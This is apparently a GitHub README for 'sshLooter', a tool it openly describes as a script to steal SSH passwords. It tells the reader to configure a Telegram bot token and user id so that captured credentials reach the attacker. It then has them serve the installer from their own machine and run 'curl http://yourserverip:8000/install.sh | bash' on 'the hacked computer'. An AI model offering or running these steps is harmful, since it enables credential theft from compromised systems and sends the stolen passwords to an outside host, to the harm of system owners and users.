# sshLooter
Script to steal passwords from ssh.

# Install
<pre>
git clone https://github.com/mthbernardes/sshLooter.git
cd sshLooter
</pre>

# Configuration
<pre>
Edit the script on install.sh, and add your telegram bot api, and your userid.
Call the @botfather on telegram to create a bot and call the @userinfobot to get your user id.
</pre>

# Usage
<pre>
On your server execute.
python -m SimpleHTTPServer

On the hacked computer execute.
curl http://yourserverip:8000/install.sh | bash
</pre>

# Original script from
<a href="http://www.chokepoint.net/2014/01/more-fun-with-pam-python-failed.html" target="_blank">ChokePoint</a>
